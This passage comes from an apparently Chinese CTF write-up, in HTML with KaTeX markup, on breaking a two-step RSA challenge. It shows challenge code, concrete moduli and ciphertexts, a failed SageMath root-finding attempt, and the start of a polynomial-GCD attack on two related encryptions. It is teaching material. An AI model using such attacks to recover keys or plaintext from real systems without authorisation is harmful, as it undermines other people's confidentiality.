class="line"><span class="built_in">print</span>(num2)</span><br><span class="line">num1 = <span class="number">9234477875452540050907055680812175733211030585401847024956094109885380715661662501110233684131338074697772834745898452222070551975818702828913932925854661</span></span><br><span class="line">num2 = <span class="number">6762350904214303306453303458299415835504119332199015610928593488027530960090511757877122152908652987754908309308543812479366000921214925642982325588758637</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>接下去我们查看第二步，第二步与共模攻击比较像，但是由于是加密俩个不同的<code>m</code>，所以不是共模攻击。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n2 = getPrime(<span class="number">512</span>) * getPrime(<span class="number">512</span>)</span><br><span class="line">e1 = randint(<span class="number">1000</span>,<span class="number">2000</span>)</span><br><span class="line">e2 = randint(<span class="number">1000</span>,<span class="number">2000</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(p+num1,e1,n2)</span><br><span class="line">c2 = <span class="built_in">pow</span>(p+num2,e2,n2)</span><br></pre></td></tr></table></figure><ul><li>稍微查看了一下思路，这一部分的思路还是运用方程的思想，将<code>c1</code>和<code>c2</code>转换为模<code>n2</code>下关于<code>p</code>的两个方程。</li><li>这时我们先用其中一个方程进行求解，查看是否能解出来，我们发现无论使用<code>c1</code>还是<code>c2</code>这个方程，都不能解出来</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">num1 = <span class="number">9234477875452540050907055680812175733211030585401847024956094109885380715661662501110233684131338074697772834745898452222070551975818702828913932925854661</span></span><br><span class="line">num2 = <span class="number">6762350904214303306453303458299415835504119332199015610928593488027530960090511757877122152908652987754908309308543812479366000921214925642982325588758637</span></span><br><span class="line">n = <span class="number">101642316595332652021348165259853423287787139517550249986161819826180514401858258316466101056877182367161299111697465439636861942636526396547011727147471566130633614685728563576613692851860684686033186826342178072882901576159305747639645374751566751967096281105148714033096611618024355982220235949274576036321</span></span><br><span class="line">e1= <span class="number">1630</span></span><br><span class="line">e2= <span class="number">1866</span></span><br><span class="line">c1= <span class="number">8857135083997055103287497833179378469532619748945804429057682575070405217145941944821968708809563240261403711644389684947851643865895254406194464015430673347359589677809515117412321862622147634752091324365628790687343748145339949310696116239361890881096088375070083053010564890401663562726144984405628773323</span></span><br><span class="line">c2= <span class="number">44531030636557714647477473185500183066851251320453194953972504422367649302810396344051696851757189817391648356459225688318373454949578822468293099948132700460437006478679492801335689493431764882835346904225119630026545592437198370606462285405519745361570058335573353886454277790277663038008240372746639859253</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (x+num1)^e1 - c1</span><br><span class="line">result = f.roots()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><ul><li>我们只能再寻找其他方式，注意到我们有俩个方程，并且这是俩个多项式方程。先将这俩个方程列出来，不妨设<code>p为未知数x</code>：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>n</mi><mi>u</mi><msub><mi>m</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><msub><mi>e</mi><mn>1</mn></msub></msup><mo>−</mo><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>f</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>n</mi><mi>u</mi><msub><mi>m</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><msub><mi>e</mi><mn>2</mn></msub></msup><mo>−</mo><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_1=(x+num_1)^{e_1}-c_1~mod(n_2)\\f_2=(x+num_2)^{e_2}-c_2~mod(n_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><ul><li>我们将这个多项式展开后就得到，得到俩个不同项数的多项式方程。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mn>1</mn></msub><mo>=</mo><msup><mi>x</mi><msub><mi>e</mi><mn>1</mn></msub></msup><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><msup><mi>x</mi><mrow><msub><mi>e</mi><mn>1</mn></msub><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>n</mi><mi>u</mi><msub><mi>m</mi><mn>1</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mi>n</mi><mi>u</mi><msubsup><mi>m</mi><mn>1</mn><msub><mi>e</mi><mn>1</mn></msub></msubsup><mo>−</mo><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>f</mi><mn>2</mn></msub><mo>=</mo><msup><mi>x</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mo>+</mo><msub><mi>h</mi><mn>1</mn></msub><msup><mi>x</mi><mrow><msub><mi>e</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>n</mi><mi>u</mi><msub><mi>m</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mi>n</mi><mi>u</mi><msubsup><mi>m</mi><mn>2</mn><msub><mi>e</mi><mn>2</mn></msub></msubsup><mo>−</mo><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f_1 = x^{e_1} + k_1x^{e_1-1}*num_1+......+num_1^{e_1}-c_1~mod(n_2)\\f_2 = x^{e_2} + h_1x^{e_2-1}*num_2+......+num_2^{e_2}-c_2~mod(n_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7977219999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7977219999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><ul><li>这时我们就可以使用辗转相除法，在多项式中的运用，先举一个例子，现在有俩个多项式</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}x^2-1\\x-1\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" 